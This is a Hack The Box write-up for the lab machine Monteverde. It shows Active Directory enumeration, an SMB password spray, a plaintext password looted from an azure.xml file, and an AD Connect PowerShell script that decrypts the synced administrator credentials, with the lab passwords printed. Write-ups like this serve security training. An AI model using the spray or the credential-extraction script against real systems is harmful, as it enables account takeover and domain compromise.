---
title:     "Hack The Box - Monteverde"
layout: post
tags: [windows,medium,azure,ldap,rpc,smb_login]
categories : HackTheBox
---

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled.png)

Monteverde was an Active Directory box, The Initial foothold we need to do password spray on to get initial shell. And we need to abuse the Azure active directory database to leak the administrator password.

Link: [https://www.hackthebox.eu/home/machines/profile/223](https://www.hackthebox.eu/home/machines/profile/223)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-29 03:07:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49778/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/29%Time=5ED08740%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -46m31s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-05-29T03:09:47
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   258.25 ms 10.10.14.1
2   287.13 ms 10.10.10.172
```

## RPC Enumeration

Connected to it without any password. we can get the list of users with `enumdomusers`

```bash
root@w0lf:~# rpcclient -U "" 10.10.10.172
Enter WORKGROUP\'s password: 
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

## LDAP Enumeration

We can search for usernames in ldap too. Just to check is there any other users left.

Here I get `sAMAccountName` first and the grep the usernames alone.

```bash
root@w0lf:~# ldapsearch -h 10.10.10.172 -x -b "DC=MEGABANK,DC=LOCAL" '(objectclass=User)' sAMAccountName
# extended LDIF
#
# LDAPv3
# base <DC=MEGABANK,DC=LOCAL> with scope subtree
# filter: (objectclass=User)
# requesting: sAMAccountName 
#

# Guest, Users, MEGABANK.LOCAL
dn: CN=Guest,CN=Users,DC=MEGABANK,DC=LOCAL
sAMAccountName: Guest

# MONTEVERDE, Domain Controllers, MEGABANK.LOCAL
dn: CN=MONTEVERDE,OU=Domain Controllers,DC=MEGABANK,DC=LOCAL
sAMAccountName: MONTEVERDE$

# AAD_987d7f2f57d2, Users, MEGABANK.LOCAL
dn: CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL
sAMAccountName: AAD_987d7f2f57d2

# Mike Hope, London, MegaBank Users, MEGABANK.LOCAL
dn: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
sAMAccountName: mhope

# SABatchJobs, Service Accounts, MEGABANK.LOCAL
dn: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
sAMAccountName: SABatchJobs

# svc-ata, Service Accounts, MEGABANK.LOCAL
dn: CN=svc-ata,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
sAMAccountName: svc-ata

# svc-bexec, Service Accounts, MEGABANK.LOCAL
dn: CN=svc-bexec,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
sAMAccountName: svc-bexec

# svc-netapp, Service Accounts, MEGABANK.LOCAL
dn: CN=svc-netapp,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
sAMAccountName: svc-netapp

# Dimitris Galanos, Athens, MegaBank Users, MEGABANK.LOCAL
dn: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
sAMAccountName: dgalanos

# Ray O'Leary, Toronto, MegaBank Users, MEGABANK.LOCAL
dn: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
sAMAccountName: roleary

# Sally Morgan, New York, MegaBank Users, MEGABANK.LOCAL
dn: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
sAMAccountName: smorgan

# search reference
ref: ldap://ForestDnsZones.MEGABANK.LOCAL/DC=ForestDnsZones,DC=MEGABANK,DC=LOC
 AL

# search reference
ref: ldap://DomainDnsZones.MEGABANK.LOCAL/DC=DomainDnsZones,DC=MEGABANK,DC=LOC
 AL

# search reference
ref: ldap://MEGABANK.LOCAL/CN=Configuration,DC=MEGABANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 15
# numEntries: 11
# numReferences: 3

root@w0lf:~# ldapsearch -h 10.10.10.172 -x -b "DC=MEGABANK,DC=LOCAL" '(objectclass=User)' sAMAccountName |grep sAMAccountName
# requesting: sAMAccountName 
sAMAccountName: Guest
sAMAccountName: MONTEVERDE$
sAMAccountName: AAD_987d7f2f57d2
sAMAccountName: mhope
sAMAccountName: SABatchJobs
sAMAccountName: svc-ata
sAMAccountName: svc-bexec
sAMAccountName: svc-netapp
sAMAccountName: dgalanos
sAMAccountName: roleary
sAMAccountName: smorgan
```

So We got same usernames from RPC and LDAP.

We can also use `GetADUsers.py` to get the list of users.

```bash
root@w0lf:~/CTF/HTB/Boxes/Monteverde# GetADUsers.py -all MEGABANK.LOCAL/ -dc-ip '10.10.10.172'
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Querying 10.10.10.172 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Guest                                                 <never>              <never>             
AAD_987d7f2f57d2                                      2020-01-03 04:23:24.984897  2020-05-29 07:47:15.269032 
mhope                                                 2020-01-03 05:10:05.908924  2020-01-03 18:59:59.037500 
SABatchJobs                                           2020-01-03 18:18:46.392235  2020-01-06 15:57:18.925036 
svc-ata                                               2020-01-03 18:28:31.332169  <never>             
svc-bexec                                             2020-01-03 18:29:55.863422  <never>             
svc-netapp                                            2020-01-03 18:31:42.786264  <never>             
dgalanos                                              2020-01-03 18:36:10.519660  <never>             
roleary                                               2020-01-03 18:38:05.832167  <never>             
smorgan                                               2020-01-03 18:39:21.629084  <never>
```

So its pretty same we got.

## Password Spraying

Since there is no other way left, I decided to Password spray on `smb`. Using `rockyou.txt` will takes time to brute force all the users so I use the same user's list as passwords wordlist.

I used a module from metasploit to do it.

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%201.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%201.png)

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%202.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%202.png)

Here we got a valid password.

## SMB Login with SABatchJobs

Logged in with `SABatchJobs : SABatchJobs`

```bash
root@w0lf:~# smbclient -L 10.10.10.172 -U SABatchJobs
Enter WORKGROUP\SABatchJobs's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	azure_uploads   Disk      
	C$              Disk      Default share
	E$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	users$          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

I decided to check `users$` share first and I recursively list  them all.

```bash
root@w0lf:~# smbclient //10.10.10.172/users$/ -U SABatchJobs
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 18:42:48 2020
  ..                                  D        0  Fri Jan  3 18:42:48 2020
  dgalanos                            D        0  Fri Jan  3 18:42:30 2020
  mhope                               D        0  Fri Jan  3 19:11:18 2020
  roleary                             D        0  Fri Jan  3 18:40:30 2020
  smorgan                             D        0  Fri Jan  3 18:40:24 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \> recurse on
smb: \> ls
  .                                   D        0  Fri Jan  3 18:42:48 2020
  ..                                  D        0  Fri Jan  3 18:42:48 2020
  dgalanos                            D        0  Fri Jan  3 18:42:30 2020
  mhope                               D        0  Fri Jan  3 19:11:18 2020
  roleary                             D        0  Fri Jan  3 18:40:30 2020
  smorgan                             D        0  Fri Jan  3 18:40:24 2020

\dgalanos
  .                                   D        0  Fri Jan  3 18:42:30 2020
  ..                                  D        0  Fri Jan  3 18:42:30 2020

\mhope
  .                                   D        0  Fri Jan  3 19:11:18 2020
  ..                                  D        0  Fri Jan  3 19:11:18 2020
  azure.xml                          AR     1212  Fri Jan  3 19:10:23 2020

\roleary
  .                                   D        0  Fri Jan  3 18:40:30 2020
  ..                                  D        0  Fri Jan  3 18:40:30 2020

\smorgan
  .                                   D        0  Fri Jan  3 18:40:24 2020
  ..                                  D        0  Fri Jan  3 18:40:24 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \> cd mhope
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
```

I found a `azure.xml` file in `mhope` directory downloaded to my machine.

## Getting User Shell

```bash
root@w0lf:~/CTF/HTB/Boxes/Monteverde# cat azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
```

It reveals a password for us. It can be user `mhope` password. We know port `5985` open so I tried `evil-winrm`

It worked I logged in with `mhope : 4n0therD4y@n0th3r$`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%203.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%203.png)

## Privilege Escalation

When checking about the user we got. It reveals he is in the group of `Azure Admins`.

```php
*Evil-WinRM* PS C:\> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               \\monteverde\users$\mhope
Last logon                   1/18/2020 11:05:46 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users         
The command completed successfully.
```

So I googled about this and found this article

> [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)

**Azure is a public cloud computing platform. It helps in synchronization of hashes and It encrypt the hashes with a dll called `mcrypt.dll`**


I did some few changes in the script. I added the IP address of the machine as Server here. Inorder to connect the database. So this script uses the same mcrypt.dll to decrypt the hash using the internal commands and gives the password in plain text.

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$server=10.10.10.172
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server = $server; Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%204.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%204.png)

I logged with the credentials we got `administrator : d0m@in4dminyeah!`

![https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%205.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-monteverde/Untitled%205.png)

We own the System